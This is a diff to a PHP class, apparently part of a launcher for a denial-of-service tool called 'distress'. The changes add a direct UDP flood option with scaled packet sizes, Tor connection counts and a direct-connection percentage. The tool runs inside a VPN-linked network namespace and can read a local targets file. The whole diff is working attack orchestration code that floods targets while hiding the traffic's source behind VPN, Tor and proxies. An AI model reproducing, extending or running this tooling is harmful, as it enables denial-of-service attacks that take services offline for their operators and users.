@@ -10,9 +10,11 @@ class DistressApplication extends distressApplicationStatic
     public function processLaunch()
     {
         global $DISTRESS_SCALE,
+               $DISTRESS_SCALE_MAX,
                $DISTRESS_DIRECT_CONNECTIONS_PERCENT,
                $DISTRESS_USE_TOR,
-               $DISTRESS_USE_PROXY_POOL;
+               $DISTRESS_USE_PROXY_POOL,
+               $DISTRESS_USE_DIRECT_UDP_FLOOD;
 
         if ($this->launchFailed) {
             return -1;
@@ -36,23 +38,23 @@ class DistressApplication extends distressApplicationStatic
 
         // ---
 
-        $directConnectionsPercent = $this->vpnConnection->getOpenVpnConfig()->getProvider()->getSetting('distressDirectConnectionsPercent');
-        if ($directConnectionsPercent === null) {
-            $directConnectionsPercent = $DISTRESS_DIRECT_CONNECTIONS_PERCENT;
+        $directConnectionsPercentJoint = $this->vpnConnection->getOpenVpnConfig()->getProvider()->getSetting('distressDirectConnectionsPercent');
+        if ($directConnectionsPercentJoint === null) {
+            $directConnectionsPercentJoint = $DISTRESS_DIRECT_CONNECTIONS_PERCENT;
         }
 
-        $directConnectionsPercent = intval($directConnectionsPercent);
+        $directConnectionsPercentJoint = intval($directConnectionsPercentJoint);
 
-        if ($directConnectionsPercent < 0  ||  $directConnectionsPercent > 100) {
-            $directConnectionsPercent = 0;
+        if ($directConnectionsPercentJoint < 0  ||  $directConnectionsPercentJoint > 100) {
+            $directConnectionsPercentJoint = 0;
         }
 
         // ---
 
-        $caUseMyIp  = '--use-my-ip=' . $directConnectionsPercent;
+        $caUseMyIp  = '--use-my-ip=' . $directConnectionsPercentJoint;
 
-        if ($directConnectionsPercent) {
-            $caUdpFlood = "--direct-udp-failover  --udp-packet-size=" . fitBetweenMinMax(128, 65536, $DISTRESS_SCALE * 2);
+        if ($DISTRESS_USE_DIRECT_UDP_FLOOD  &&  $DISTRESS_SCALE > 128) {
+            $caUdpFlood = "--direct-udp-failover  --udp-packet-size=" . fitBetweenMinMax(32, 0xffff, intRound($DISTRESS_SCALE * 3));
         } else {
             $caUdpFlood = '';
         }
@@ -61,10 +63,11 @@ class DistressApplication extends distressApplicationStatic
 
         $caLocalTargetsFile = static::$useLocalTargetsFile  ?  '--targets-path="' . static::$localTargetsFilePath . '"' : '';
 
-        $caUseTor = '';
-        if ($DISTRESS_USE_TOR) {
+        if ($DISTRESS_USE_TOR   &&  $DISTRESS_SCALE > 64) {
             $torConnections = fitBetweenMinMax(1, 10, intRound($DISTRESS_SCALE / 1000));
             $caUseTor = '--use-tor=' . $torConnections;
+        } else {
+            $caUseTor = '';
         }
 
         $command =    'setsid   ip netns exec ' . $this->vpnConnection->getNetnsName()
